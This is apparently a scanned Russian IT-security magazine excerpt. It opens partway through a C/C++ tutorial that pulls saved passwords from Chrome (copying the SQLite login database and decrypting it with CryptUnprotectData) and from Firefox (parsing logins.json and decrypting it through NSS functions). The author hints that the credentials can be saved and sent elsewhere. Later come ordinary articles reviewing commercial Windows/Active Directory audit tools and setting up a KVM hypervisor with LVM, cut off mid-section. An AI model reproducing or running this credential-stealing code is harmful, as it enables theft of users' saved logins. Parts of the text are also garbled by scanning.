    memset(db_loc, 0, MAX_PATH);
    if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0
, db_loc))) {
        return 0;
    }
    if (browser_family == 0) {
        lstrcat(db_loc, TEXT(location));
        return 1;
    }
}

Вызов функции:


char browser_db[MAX_PATH];
get_browser_path(browser_db, 0, CHROME_DB_PATH);

Давай вкратце поясню, что здесь происходит. Мы сразу пишем эту функцию,
подразуме вая будущее рас ширение. Один из ее  аргу ментов — поле
browser_family, оно будет сигнализировать о семействе браузе ров, базу
данных  которых мы  получаем  (то  есть бра узеры  на  основе Chrome
или Firefox).
   Если условие browser_family  ==  0 выполняется, то получаем базу
паролей браузе ра на основе Chrome, если browser_family == 1 — Firefox.
Идентификатор CHROME_DB_PATH ука зывает на базу паролей Chrome. Далее
мы получаем путь к базе при помощи функции SHGetFolderPath, передавая
ей в качестве аргумента CSIDL значение CSIDL_LOCAL_APPDATA, которое
означает:


#define CSIDL_LOCAL_APPDATA 0x001c // <user name>\Local Settings\
Applicaiton Data (non roaming)

Функция SHGetFolderPath уста рела, и в Microsoft рекомендуют использовать
вместо нее SHGetKnownFolderPath. Проб лема в том, что поддержка этой
функции начинается с Windows Vista, поэтому я применил ее более старый
аналог для сохранения обратной совместимости. Вот ее прототип:


HRESULT SHGetFolderPath(
    HWND hwndOwner,
    int nFolder,
    HANDLE hToken,
    DWORD dwFlags,
    LPTSTR pszPath
);

После этого функция lstrcat совмещает результат работы SHGetFolder‐
Path с идентификатором CHROME_DB_PATH.
  База паролей получена, теперь приступа ем к работе с ней. Как я уже
говорил, это база данных SQLite, работать с ней удобно через SQLite API,
которые подключаются с заголо вочным файлом sqlite3.h. Давай скопируем
файл базы данных, чтобы не занимать его и не мешать работе браузера.


int status = CopyFile(browser_db, TEXT(".\\db_tmp"), FALSE);
if (!status) {
    // return 0;
}

Теперь подклю чаемся к базе командой sqlite3_open_v2. Ее прототип:


int sqlite3_open_v2(
    const char *filename,   /* Database filename (UTF‐8) */
    sqlite3 **ppDb,         /* OUT: SQLite db handle */
    int flags,              /* Flags */
    const char *zVfs        /* Name of VFS module to use */
);

Первый аргумент — наша база данных; информа ция о подключении возвра‐
щается во второй аргумент, дальше идут флаги открытия, а четвертый аргу‐
мент  определяет  интерфейс  операционной  системы,  который  должен
использовать это подключение к базе данных, в нашем случае он не нужен.
Если эта функция отработа ет корректно, воз вра щается значение SQLITE_OK,
в противном случае возвращается код ошиб ки.


sqlite3 *sql_browser_db = NULL;
status = sqlite3_open_v2(TEMP_DB_PATH,
                &sql_browser_db,
                SQLITE_OPEN_READONLY,
                NULL);
if(status != SQLITE_OK) {
    sqlite3_close(sql_browser_db);
    DeleteFile(TEXT(TEMP_DB_PATH));
}


             INFO

                   Обрати внимание: при некоррек тной отра ботке
                     функции  нам  все  равно  необходимо  самос‐
                        тоятельно закрыть подключение к базе и удалить
                       ее копию.


Теперь начинаем непосредс твенно обрабаты вать данные в базе. Для этого
воспользуемся функцией sqlite3_exec().


status = sqlite3_exec(sql_browser_db,
            "SELECT origin_url, username_value, password_value FROM
logins",
            crack_chrome_db,
            sql_browser_db,
            &err);
if (status != SQLITE_OK)
    return 0;

Эта функция имеет такой прототип:


int sqlite3_exec(
    sqlite3*,                          /* An open database */
    const char *sql,                   /* SQL to be evaluated */
    int (*callback)(void*,int,char**,char**),  /* Callback */
    void *,                            /* 1st argument to callback */
    char **errmsg                      /* Error msg written here */
);

Первый аргумент — наша база паролей, второй — это команда SQL, которая
вытаскивает URL файла, логин, пароль и имя пользователя, третий аргу‐
мент — это функция обратного вызова, которая и будет рас шифровывать
пароли, чет вертый — передается в нашу функцию обратного вызова, ну
а пятый аргумент сооб щает об ошибке.
  Давай остановимся подробнее на callback‐функции, которая расшифро‐
вывает пароли. Она будет применять ся к каж дой строке из выборки нашего
запроса SELECT. Ее прототип — int  (*callback)(void*,int,char**,
char**), но все аргументы нам не понадобятся, хотя объявле ны они дол жны
быть. Саму функцию назовем crack_chrome_db, начинаем писать и объ‐
являть нужные переменные:


int crack_chrome_db(void *db_in, int arg, char **arg1, char **arg2) {
DATA_BLOB data_decrypt, data_encrypt;
sqlite3 *in_db = (sqlite3*)db_in;
BYTE *blob_data = NULL;
sqlite3_blob *sql_blob = NULL;
char *passwds = NULL;
while (sqlite3_blob_open(in_db, "main", "logins", "password_value",
count++, 0, &sql_blob) != SQLITE_OK && count <= 20 );

В этом цикле фор мируем BLOB (то есть большой массив двоичных данных).
Далее выделяем память, читаем блоб и инициализиру ем поля DATA_BLOB:


int sz_blob;
int result;
sz_blob = sqlite3_blob_bytes(sql_blob);
dt_blob = (BYTE *)malloc(sz_blob);
if (!dt_blob) {
    sqlite3_blob_close(sql_blob);
    sqlite3_close(in_db);
}
data_encrypt.pbData = dt_blob;
data_encrypt.cbData = sz_blob;

А теперь приступим непосредс твенно к дешифровке. База данных Chrome
зашифрована механизмом Data Protection Application Programming Interface
(DPAPI). Суть этого механизма заключается в том, что расшифровать данные
можно только под той учетной записью, под которой они были зашифрованы.
Другими словами, нельзя стащить базу данных паролей, а потом расшифро‐
вать ее уже на своем компьютере. Для расшифровки данных нам потребу ется
функция CryptUnprotectData.


DPAPI_IMP BOOL CryptUnprotectData(
    DATA_BLOB                 *pDataIn,
    LPWSTR                    *ppszDataDescr,
    DATA_BLOB                 *pOptionalEntropy,
    PVOID                     pvReserved,
    CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,
    DWORD                     dwFlags,
    DATA_BLOB                 *pDataOut
);
if (!CryptUnprotectData(&data_encrypt, NULL, NULL, NULL, NULL, 0, &
data_decrypt)) {
    free(dt_blob);
    sqlite3_blob_close(sql_blob);
    sqlite3_close(in_db);
}

После этого выделяем память и заполняем мас сив passwds расшифрован‐
ными данными.


passwds = ( char *)malloc(data_decrypt.cbData + 1);
memset(passwds, 0, data_decrypt.cbData);
int xi = 0;
while (xi < data_decrypt.cbData) {
    passwds[xi] = (char)data_decrypt.pbData[xi];
    ++xi;
}

Собственно, на этом все! После этого passwds будет содержать учетные
записи пользователей и URL. А что делать с этой информацией — вывести ее
на экран или сохранить в файл и отпра вить куда‐то его — решать тебе.


FIREFOX
Переходим к Firefox. Это будет немного сложнее, но мы все равно справимся!
:) Для начала давай получим путь до базы данных паролей. Помнишь, в нашей
универсальной  функции  get_browser_path  мы  передавали  параметр
browser_family? В случае Chrome он был равен нулю, а для Firefox пос‐
тавим 1.


bool get_browser_path(char * db_loc, int browser_family, const char *
 location) {
    ...
    if (browser_family == 1) {
        memset(db_loc, 0, MAX_PATH);
        if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA,
NULL, 0, db_loc))) {
            // return 0;
        }

В случае с Firefox мы не сможем, как в Chrome, сразу указать путь до папки
пользователя. Дело в том, что имя пап ки пользовательского профиля генери‐
руется случайно. Но это ерундовая преграда, ведь мы знаем начало пути (\\
Mozilla\\Firefox\\Profiles\\). Дос таточно поискать в нем объ ект «пап‐
ка» и проверить наличие в ней файла \\logins.json". Именно в этом файле
хранятся  интересующие  нас  данные  логинов  и  паролей.  Разумеется,
в зашифрованном виде. Реализуем все это в коде.


lstrcat(db_loc, TEXT(location));
// Объявляем переменные
const char * profileName = "";
WIN32_FIND_DATA w_find_data;
const char * db_path = db_loc;
// Создаем маску для поиска функцией FindFirstFile
lstrcat((LPSTR)db_path, TEXT("*"));
// Просматриваем, нас интересует объект с атрибутом FILE_ATTRIBUTE_
DIRECTORY
HANDLE gotcha = FindFirstFile(db_path, &w_find_data);
while (FindNextFile(gotcha, &w_find_data) != 0){
    if (w_find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        if (strlen(w_find_data.cFileName) > 2) {
            profileName = w_find_data.cFileName;
        }
    }
}
// Убираем звездочку :)
db_loc[strlen(db_loc) ‐ 1] = '\0';
lstrcat(db_loc, profileName);
// Наконец, получаем нужный нам путь
lstrcat(db_loc, "\\logins.json");
return 1;

В самом конце переменная db_loc, которую мы передавали в качес тве аргу‐
мента в нашу фун кцию, содержит полный путь до файла logins.json, а фун‐
кция возвращает 1, сигнализируя о том, что она отработала корректно.
   Теперь получим хендл файла паролей и выделим память под данные.
Для получения хендла используем функцию CreateFile, как советует MSDN.


DWORD read_bytes = 8192;
DWORD lp_read_bytes;
char *buffer = (char *)malloc(read_bytes);
HANDLE db_file_login = CreateFileA(original_db_location,
                GENERIC_READ,
                FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                NULL, OPEN_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL);
ReadFile(db_file_login, buffer, read_bytes, &lp_read_bytes, NULL);

Все готово, но в случае с Firefox все не будет так просто, как с Chrome, — мы
не сможем просто получить нужные данные обычным запросом SELECT, да и
шифрование не ограничивается одной‐единственной функцией WinAPI.


Network Security Services (NSS)
Браузер  Firefox  активно  использует функции  Network  Security  Services
для реализации шифрования своей базы. Эти функции находятся в динами‐
ческой библиотеке, которая лежит по адресу C:\Program Files\Mozilla
Firefox\nss3.dll.
  Все интересующие нас функции нам при дется получить из этой DLL. Сде‐
лать это можно стандартным обра зом, при помощи LoadLibrary\GetPro‐
cAdress. Код однообразный и большой, поэтому я просто приведу спи сок
функций, которые нам понадо бят ся:
 • NSS_Init;
 • PL_Base64Decode;
 • PK11SDR_Decrypt;
 • PK11_Authenticate;
 • PK11_GetInternalKeySlot;
 • PK11_FreeSlot.

Это функции инициализации механизма NSS и расшифровки данных. Давай
напишем функцию расшифровки, она небольшая. Я добавлю комментарии,
чтобы все было понятно.


char * data_uncrypt(std::string pass_str) {
    // Объявляем переменные
    SECItem crypt;
    SECItem decrypt;
    PK11SlotInfo *slot_info;
    // Выделяем память для наших данных
    char *char_dest = (char *)malloc(8192);
    memset(char_dest, NULL, 8192);
    crypt.data = (unsigned char *)malloc(8192);
    crypt.len = 8192;
    memset(crypt.data, NULL, 8192);
    // Непосредственно расшифровка функциями NSS
    PL_Base64Decode(pass_str.c_str(), pass_str.size(), char_dest);
    memcpy(crypt.data, char_dest, 8192);
    slot_info = PK11_GetInternalKeySlot();
    PK11_Authenticate(slot_info, TRUE, NULL);
    PK11SDR_Decrypt(&crypt, &decrypt, NULL);
    PK11_FreeSlot(slot_info);
    // Выделяем память для расшифрованных данных
    char *value = (char *)malloc(decrypt.len);
    value[decrypt.len] = 0;
    memcpy(value, decrypt.data, decrypt.len);
    return value;
}

Теперь осталось парсить файл logins.json и при менять нашу функцию рас‐
шифровки. Для краткости кода я буду использовать регулярные выражения
и их возможности в C++ 11.


string decode_data = buffer;
// Определяем регулярки для сайтов, логинов и паролей
regex user("\"encryptedUsername\":\"([^\"]+)\"");
regex passw("\"encryptedPassword\":\"([^\"]+)\"");
regex host("\"hostname\":\"([^\"]+)\"");
// Объявим переменную и итератор
smatch smch;
string::const_iterator pars(decode_data.cbegin());
// Парсинг при помощи regex_search, расшифровка данных нашей
// функцией data_uncrypt и вывод на экран расшифрованных данных
do {
    printf("Site\t: %s", smch.str(1).c_str());
    regex_search(pars, decode_data.cend(), smch, user);
    printf("Login: %s", data_uncrypt(smch.str(1)));
    regex_search(pars, decode_data.cend(), smch, passw);
    printf("Pass: %s",data_uncrypt( smch.str(1)));
    pars += smch.position() + smch.length();
} while (regex_search(pars, decode_data.cend(), smch, host));


ЗАКЛЮЧЕНИЕ
Мы разобрались, как хранятся пароли в раз ных бра узерах, и узнали, что нуж‐
но делать, чтобы их извлечь. Можно ли защититься от подобных методов вос‐
становления сохраненных паролей? Да, конечно. Если установить в браузере
мастер‐пароль, то он выступит в качестве криптографической соли для рас‐
шифровки базы данных паролей. Без ее зна ния восстановить данные будет
невозможно.
АДМИН


   ВЫБИРАЕМ КОММЕРЧЕСКИЙ СОФТ
     ДЛЯ КОМПЛЕКСНОЙ ПРОВЕРКИ
          БЕЗОПАСНОСТИ





     Иван Пискунов
АУДИТ
WINDOWS




В сегодняшнем материале мы продолжаем наш прак тичес‐
кий обзор самых популярных и фун кциональ ных утилит про‐
верки уровня защищенности (Hardening) десктопных и сер‐
верных версий Windows. В первой части материала мы сос‐
редоточили внимание на бесплатных и open sources инстру‐
ментах, дос тупных абсолютно каж дому, сегодня же уклон
сделаем в сторону коммерческих программ и комплексных
решений, заточенных на enterprise‐сектор.


ПОЧЕМУ КОММЕРЧЕСКИЙ СОФТ НЕОБХОДИМ ДЛЯ ENTERPRISE-
КОМПАНИЙ?
Бесплатные и опенсорсные решения из предыду щей статьи формиру ют
простой, но мощный арсенал средств, которые могут многое сооб щить о сос‐
тоянии hardening state машин под управлением Windows. Однако, если рас‐
сматривать задачи аудита ИБ в большой или средней компании с раз вет‐
вленной сетью, сотнями хостов и раз нородной серверной фермой, воз‐
можностей таких инструментов может не хва тить. И на то существует несколь‐
ко причин, которые кратко сейчас перечислим.


Бесплатные версии платной программы
Разработчики, которые хотят, чтобы их труд оплачивался, часто наряду с ком‐
мерческой версией пускают и бесплатную редакцию программы. При этом
бесплатная версия содержит огра ничения, а функциональные возможности
ее усечены. К примеру, может отсутствовать возможность сканировать
по сети, проводить дополнительные тес ты, стро ить полноценные отчеты
и графики, выгружать в другие системы или форматы данных. Коммерческие
же версии изначально проектирова лись на enterprise‐сектор и уже «из короб‐
ки» имеют ряд фич, без которых большую сеть или серверную ферму тестами
не покрыть.


Ско рость и удобство использования
В большинстве случаев у аудитора время для сбора данных и проведения
тестов очень ограниченно, а объем выборки тес тиру емых ИТ‐систем может
составлять сотни хостов. Поэтому аудитор ставит своей задачей максималь‐
но автоматизировать тестирование и получать результаты на анализ как мож‐
но быстрее и с минимальным вмешательством в процесс. Бесплатное
ПО всем этим редко когда может похвастать ся. А вот коммерческие версии
имеют отдельные GUI‐консоли для управления, генерации отчетов, агрегации
и обмена данными с другими средс твами защиты, к примеру сканерами уяз‐
вимостей или SIEM‐сис темами.
   Также в отличие от бесплат ных тулз, где часто каждый новый запуск
на новой машине нужно настраивать отдельно, коммерческое ПО позволяет
запускать типовые тесты одновременно на всех машинах домена, парал лель‐
но собирая допол нительные данные и тут же выкаты вая это все в итоговые
отчеты.


Формальные тре бования aka compliance
Требования законов, приказов и стандартов могут быть самыми разными.
К примеру, в государственных орга нах существу ет директива на исполь‐
зование только отечественного и сертифицированного ПО. PCI DSS содер‐
жит строго утвержденный список ПО, которое одобрено платежным кон‐
сорциумом для исполь зования в качестве средств защиты. Бесплатное
ПО просто‐напросто никто не сертифицирует и не вносит в перечень сис‐
темно значимых. Поэто му, даже если бесплат ный инструмент обладает воз‐
можностями своих коммерческих соб рать ев, исполь зовать его на постоянной
основе, а тем более проходить с помощью него сертификационный аудит
будет нельзя.


ОБЗОР ИНСТРУМЕНТОВ
ADManager Plus & ADAudit Plus (ManageEngine)
Два крутецких инструмента для анализа безопасности каталога Active Directo‐
ry — это ADManager Plus и ADAudit Plus от компании‐раз работчика Man‐
ageEngine.
  ADAudit Plus в режиме реального времени отслеживает активность вхо‐
да пользователей в систему Windows и мониторит все изме нения в объектах
групповой политики, дос туп к корпоративным ресурсам, задания планиров‐
щика, обращение к периферии (USB, прин теры), сооб щения безопасности
журнала Windows. Также тулзу можно запрограммировать сообщать, когда
какому‐то  пользователю  временно  или  постоянно  пре доставляются
повышенные привилегии в системе, ведь это значимый инди катор потен‐
циальной хакерской ата ки! Все отчеты с предупреждениями пос тупают в GUI‐
интерфейс программы либо отправляются адми нистраторам и офи церам
безопасности на электронную почту.
   Главный даш борд представляет собой набор вкладок, переключаясь
по которым мы будем попадать в различные конфигурационные блоки. Ауди‐
тора будут инте ресовать прежде всего три: File Audit, Server Audit и Re-
ports. Переходя на каждую вкладку, мы попадаем в соответствующий блок.
К примеру, для вкладки Server Audit слева будет меню выбора групп (объ‐
ектов аудита), а справа — гра фический дашборд, иллюс трирующий текущее
состояние объекта контроля (в данном случае, к примеру, количество соз‐
данных, уделенных, модифицированных директорий).





                    Стартовый экран ADAudit Plus

Вкладка с отчетами предос тавляет огромное количес тво фильтров и критери‐
ев для генерации отчетов. К примеру, для оперативного управления можно
смотреть отчеты за последние 24 часа, сравнивать состояния на определен‐
ную дату и выделять различия.





               Дашборд с отчетами в ADAudit Plus

ADAudit Plus бесплатен при использовании до 25 хос тов, но нес колько уре зан
в функциональности. Полноценные версии Standard (595 долларов) и Profes‐
sional (945 долларов) не имеют огра ничений и содержат более 200 тес тов
проверки опций безопасности для Windows‐систем. Для тех, кто желает озна‐
комиться с интерфейсом программы без установки, раз работчик пре дос‐
тавляет live demo от лица администра тора системы и от лица техника службы
HelpDesk.
   Кстати, ADAudit Plus использует ся средними и крупными компаниями
не только для аудита, но и для обеспечения соответствия таким compliance‐
требованиям, как SOX, HIPAA, GLBA, PCI‐DSS, FISMA. Таким образом гаран‐
тируется выполнение требова ния о сис тематической проверке и мониторин‐
ге в режиме 24/7 ИТ‐инфраструктуры на предмет несанкционированных
изменений с генерацией периодичес ких отчетов о безопасности и уведом‐
лениями по электронной почте в качестве стандартной процедуры.
   Загрузить ADAudit Plus можно с официальной страницы сайта разработ‐
чика — для x86‐ и x64‐систем.
  ADManager Plus — это простое в использовании решение для каталога
Active Directory с целью управления и подготовки отчетности по многим опци‐
ям, в том числе и security settings. ADManager Plus решает много задач,
но основные из них:
 • автоматизация  рутин ных действий администраторов AD  (управле ние
   и отчетность AD);
 • массовое создание и удаление объектов AD, управление ими;
 • управление пользователями AD через мобильные приложения;
 • аудит соответствия compliance‐требованиям, например SOX, HIPAA, то
   есть аналогично тому, что делает ADAudit Plus.

После логона в ADManager Plus попада ешь в дашборд панели мониторинга
корпоративного каталога Active Directory, среди прочего в реальном времени
будет отображаться количес тво активных пользователей, неактивных/заб‐
локированных  пользователей,  последние  логоны,  настройки  политик
для отдельных OU. При этом можно щелкнуть на каждый юнит и выбрать все
доступные действия — от перемещения/удаления до переключения в группы
безопасности и настройки индивиду альных прав доступа.





                  Стартовый экран ADManager Plus

Для перехода в режим управления необ ходимо на главном дашборде перек‐
лючиться на вкладку AD Mgmt, она вторая слева в верхней полосе меню.
После этого перед администра тором или аудитором откры вается страница
с перечислением всех возможных опций управления объ ектами AD. Функци‐
онально все действия, представленные на странице, разбиты на две части:
первая — Bulk User Management с доступными пунктами User Creation,
User Templates, CSV Import, вто рая — Bulk User Modification с кучей воз‐
можностей для модификации, в том числе раз деленных на под группы — Ex‐
change Tasks, Exchange Limits, Terminal Services.





    Дашборд с отоб ражением функций менеджмента в ADManager Plus

Переключившись на сле дующую вкладку, AD Reports, мы попадаем на стра‐
ницу, где можно формировать разнооб разные отчеты. Слева представлено
меню из 16 групп (User Reports, Password Reports, Group Reports, Computer
Reports, Exchange Reports и другие) и основного окна справа, занимающего
большую часть экрана, где можно выбирать те критерии, по которым будет
формироваться отчет.





            Отчеты по сос тоянию объектов Active Directory

ADManager Plus — программа коммерчес кая, для ознакомления доступна tri‐
al‐версия на 30 дней — для x86‐ и x64‐сис тем.


             INFO

                        Hardening — это термин из мира ИБ, который
                      обозначает процесс обеспечения безопасности
                       системы (программы) за счет снижения ее уяз‐
                      вимости и, как пра вило, с использованием только
                       штатных утилит или механизмов защиты.



AD Permissions Reporter
Еще одна интересная и полезная тулза для экспресс‐ауди та Active Directory
называется AD Permissions Reporter. Как уже понят но из названия, главная ее
задача — это проверка прав доступа в объектах AD и генерация отче тов.
К примеру, эта утилита отлично подойдет для документирования всех пол‐
номочий пользователей и их изменений в корпоративном домене, а также
для сравнения текущих зна чений с эталонной матрицей доступа.
  Интерфейс программы выполнен в лен точном стиле, пришедшем к нам
из MS Oﬃce, и представлен четырь мя вкладками: Report, Import/Export,
Command Line и Help. На главной вкладке Report можно просмотреть спи‐
сок всех пользователей домена и, щелкая на каждый отдельный объект, под‐
робно изучить назначение тех или иных прав. Отдель но есть окно для прос‐
мотра ошибок, возникших при ска ниро вании AD: воз можно, эти объекты уда‐
лены или их целостность нарушена — в общем, на это тоже стоит обратить
внимание.





                  Главное окно AD Permissions Reporter

Программа предоставля ет гибкие воз можнос ти выб рать фильтры для получе‐
ния информативного отчета.





          Окно с выбором фильтров в AD Permissions Reporter

На вкладке Import/Export можно подгружать ранее соз данные отче ты либо
выгружать с заданными фильтрами результаты текущего сканирования. Поль‐
зователю пре доставляется большой выбор опций экспортирования в Excel‐
файл.





             Окно выбора экспортируемых параметров

Ну а вкладка Command Line, как уже понятно из названия, позволяет фор‐
мировать автоматически выполняемые задания для систематического ска‐
нирования и сохранения результатов в виде отчетов. Также можно выбрать
домен, по которо му будет выполняться ска нирование, учетную запись поль‐
зователя, параметры запуска, опции экспорта фай ла отчета, набор фильтров
и тому подобное.





  Окно выбора параметров запус ка AD Permissions Reporter в режиме CLI

Программа поставляется в двух вариантах — бес платная версия и profession‐
al, стоимость которой варьиру ется от 149 дол ларов за single‐лицензию
до 579 долларов за редакцию Enterprise. Главные отличия professional‐версии
состоят в поддержке экспорта результатов ска ниро вания в файл популярных
форматов (Excel XLSX, CSV, HTML), мощной системе фильтрации и полной
поддержке командной строки с целью запус ка в автоматическом режиме
по расписанию.


             INFO

                    По сравнению с проверкой безопасности дес‐
                        ктоп ных версий Windows аудит серверной фермы
                        требует расширен ного списка контролей и ряда
                         тестов, характерных для отдельных эле ментов
                       ИТ‐инфраструктуры, таких, например, как Active
                             Directory, MS SQL Server или почтовик Exchange.



Netwrix Auditor Active Directory
Почти любой админ средней и тем более крупной компании со сложной
иерархией доменов знает или хотя бы точно слышал о группе продуктов
Netwrix Tools от компании‐разработ чика Netwrix. Сре ди них множество
отдельных утилит, к примеру для работы с объекта ми AD (Account Lockout Ex‐
aminer, Active Directory Object Restore Wizard, Group Policy Auditing), поль‐
зователями и пароля ми (Inactive User Tracking, Logon Reporter, Password Expi‐
ration Alerting).





                  Стартовая стра ница Netwrix Auditor

Нас же будет интересовать продукт Netwrix Auditor Active Directory, приз‐
ванный предоставлять полный контроль над событиями в Active Directory
и Group Policy, формировать отчеты и оповещения по каждому изме нению,
что позволяет сравнивать текущие объекты и нас трой ки с их значением
на любую дату в прошлом.





  Пример событий безопас ности, генери руемых для объектов Netwrix
  Auditor





             Просмотр информации об уда лен ном хосте

Соответственно, это дает администра тору или офи церу безопасности воз‐
можность анализировать несанкционированные изменения в AD, на этом
основании генерировать уведомления об угрозах безопас ности (хакерской
атаке), проводить автоматизированный контроль прав дос тупа, отслеживать
неактивные учетные записи, истекшие пароли, а также проводить аудит входа
пользователей в систему.





       Дашборд Netwrix Auditor с данными аудита Active Directory

Для больших компаний в час ти обязательных compliance‐требований это поз‐
воляет снижать риск зло употребления привилегиями, помогает соблюдать
внутреннюю политику безопас ности, а также помогает проходить сертифика‐
цию по государственным и отраслевым стандартам ИБ.
  К сожалению для избалованных халявой соотечественников, тулза ком‐
мерческая и в свободном дос тупе ее нет, но для озна комления с возможнос‐
тями  разработчики  предлага ют  полноценную  20‐дневную  trial‐версию,
которую можно получить с сайта компании, заполнив небольшую анке ту.


ЗАКЛЮЧЕНИЕ
Вот и вторая часть нашего обзора подошла к завершению. На сей раз мы
подробно рассмотрели самые ходовые коммерческие инстру менты аудита
безопасности, которые можно применять как для десктопа, так и для сер‐
верных редакций Windows. Это прежде всего утилиты, ориентированные
на большую сеть предприятия, включающую такие инфраструктурные элемен‐
ты, как Active Directory, Exchange Server, IIS, MS SQL Server и подоб ные.
  А чтобы усилить исходный уро вень защищенности (hardening state), нельзя
забывать про все фичи, которые идут в поставке с операционной системой:
это и старые добрые UAC, BitLocker, NAP, AppLocker, и новые SmartScreen,
Credential Guard, Device Guard, Microsoft Passport, Advanced Threat Protection
и тому подобные. Не стоит и пренебрегать рекомендациями Microsoft и дру‐
гих организаций по настройке соответству ющих опций безопасности (Hard‐
ening Guide).
АДМИН
 РЕЗИНОВЫЙ
 ГИПЕРВИЗОР

   ИСПОЛЬЗУЕМ ЛОГИЧЕСКИЕ ГРУППЫ
 ДЛЯ ВИРТУАЛИЗАЦИИ QEMU‐KVM В LINUX





В  жизни  сисадмина  однажды  настает
момент,  когда приходится  с  нуля  раз‐
ворачивать  инфраструктуру  предприятия
либо  переделывать  уже  имеющуюся,
перешедшую по наследству. В этой статье         Иван Рыжевцев                                                                              Системный администратор с
я расскажу о том, как пра вильно развернуть       Прошедшийбогатымогонь,опытом.воду и
гипервизор на основе Linux KVM и libvirt c      девизмедныев жизни:трубы.НерешаемыхГлавный
поддержкой LVM (логических групп).                     задачправильноенет, надо решение!только найти
                                                                                           ryzhevtsev@gmail.com

Мы пройдемся по всем тонкостям управления гипервизором, включая кон‐
сольные и GUI‐утилиты, расширение ресурсов и миграцию виртуальных
машин на другой гипер визор.
  Для начала разберемся с тем, что такое виртуализация. Официальное
определение звучит так: «Виртуализация — это предоставление набора
вычислительных ресурсов или их логичес кого объ единения, абстрагирован‐
ное от аппаратной реализации и обеспечива ющее при этом логичес кую изо‐
ляцию друг от друга вычислительных процессов, выполняемых на одном
физическом ресурсе». То есть, если выражаться человеческим языком, имея
один мощный сервер, мы можем превратить его в несколько средних сер‐
веров, и каждый из них будет выполнять свою задачу, отведенную ему
в инфраструктуре, не мешая при этом дру гим.
  Системные администраторы, работающие вплотную с виртуализаци ей
на предприятии, мастера и виртуозы своего дела, поделились на два лагеря.
Одни — приверженцы высокотехнологичной, но безумно дорогой VMware
для Windows. Другие — любители open source и бесплатных решений
на основе  Linux VM. Мож но долго перечис лять пре имущества VMware,
но здесь мы остановимся на виртуализации, основанной на Linux VM.


ТЕХНОЛОГИИ ВИРТУАЛИЗАЦИИ И ТРЕБОВАНИЯ К ЖЕЛЕЗУ
Сейчас есть две популярные технологии виртуализации: Intel VT и AMD‐V.
В Intel VT (от Intel Virtualization Technology) реализова на виртуализация режима
реальной адресации;  соответствующая  аппа рат ная  виртуализация  вво‐
да‐вывода называется VT‐d. Час то эта технология обозначается аббревиату‐
рой VMX (Virtual Machine eXtension). В AMD соз дали свои рас ширения вир‐
туализации и первоначально называли их AMD Secure Virtual Machine (SVM).
Когда технология доб ралась до рынка, она стала называться AMD Virtualiza‐
tion (сокращенно AMD‐V).
  Перед тем как вводить аппа рат ное обеспечение в эксплуатацию, убедись,
что оборудование поддерживает одну из этих двух технологий (пос мотреть
можно в характеристиках на сайте про изво дителя). Если под держка вир‐
туализации имеется, ее необходимо включить в BIOS перед разверты ванием
гипервизора.


        WWW

                      Вот полезный список процессоров с поддержкой
                          технологии виртуализации.


Среди других требований гипервизоров — поддержка аппаратного RAID (1, 5,
10), которая повышает отка зоустойчивость гипервизора при выходе жестких
дисков из строя. Если поддержки аппа рат ного RAID нет, то можно исполь‐
зовать программный на крайний случай. Но RAID — это мастхэв!
  Решение, описанное в этой статье, несет на себе три виртуальные
машины и успешно работа ет на минимальных требованиях: Core 2 Quad
Q6600 / 8 Гбайт DDR2 PC6400 / 2 × 250 Гбайт HDD SATA (хардверный RAID 1).


УСТАНОВКА И НАСТРОЙКА ГИПЕРВИЗОРА
Я покажу, как настраивать гипер визор, на примере Debian Linux 9.6.0 — Х64‐
86. Ты можешь исполь зовать любой дистрибутив Linux, который тебе по душе.
   Когда ты определишься с выбором железа и его наконец‐то привезут,
придет время ставить гипервизор. При уста новке ОС все делаем, как обычно,
за исключением разметки дисков. Неопытные адми нис траторы час то выбира‐
ют опцию «Авто матически раз бить все дисковое пространство без исполь‐
зования LVM». Тогда все данные будут записа ны на один том, что нехорошо
по нескольким причинам. Во‐первых, если жесткий диск выйдет из строя, ты
потеряешь все данные. Во‐вто рых, изменение фай ловой системы дос тавит
массу хлопот.
  В общем, что бы избежать лишних телодвижений и потери времени,
рекомендую использовать раз метку диска с LVM.


Logical Volume Manager
Менеджер логических томов (LVM) — это подсистема, доступная в Linux
и OS/2, построенная поверх Device Mapper. Ее задача — представление раз‐
ных областей с одного жесткого диска или областей с нескольких жестких
дисков в виде одного логического тома. LVM создает из физичес ких томов
(PV — Phisical Volumes) логическую группу томов (VG — Volumes Group). Она,
в свою оче редь, состоит из логичес ких томов (LV — Logical Volume).
  Сейчас во всех дистрибутивах Linux с ядром 2.6 и выше есть поддержка
LVM2. Для использования LVM2 на ОС с ядром 2.4 надо устанавливать патч.


После того как система обна ружила жес ткие накопители, запустится менед‐
жер разбивки жестких дисков. Выбира ем пункт Guided — use entire disk
and set up LVM.





                 Guided — use entire disk and set up LVM

Теперь выбираем диск, на который будет уста новлена наша группа томов.





                    Выбор диска для LVM

Система предложит варианты разметки носителя. Выбираем «Записать все
файлы на один раздел» и идем дальше.





                Записать все файлы на один раздел

Система оповестит о том, что необходимо сохранить созданные изме нения
при разметке. Смело сог лаша емся, выбрав Yes.





            Запись сохраненных изменений при разметке

После сохранения изменений мы получим одну логичес кую группу и два тома
в ней. Первый — это корневой раз дел, а вто рой — это файл подкачки. Тут
многие зададут вопрос: а почему не выб рать раз метку вручную и не создать
LVM самому?
  Я отвечу просто: при создании логичес кой груп пы VG загрузочный раз дел
boot не пишется в VG, а соз дается отдельным разделом с файловой сис‐
темой ext2. Если это го не учесть, то загрузочный том окажется в логической
группе. Это обречет тебя на мучения и стра дания при восстановлении заг‐
рузочного тома. Имен но поэто му заг рузочный раздел отправляется на том
без LVM.





                Состояние дисков пос ле раз метки

Переходим к конфигурации логичес кой группы для гипервизора. Выбираем
пункт «Конфигурация менеджера логических томов».





              Конфигура ция менеджера логических томов

Система оповестит о том, что все изменения будут записаны на диск. Сог‐
лашаемся.





            Запись сохраненных изменений при разметке

Далее в менеджере логических томов удаляем сна чала созданные логичес‐
кие тома vg‐<hostname>_root и vg‐<hostname>_swap. А потом и саму
логическую группу vg‐<hostname>.
  Создадим новую группу — к примеру, назовем ее vg_sata.





                Создание новой логичес кой группы


             INFO

                   В серверах используются носите ли SATA, SSD,
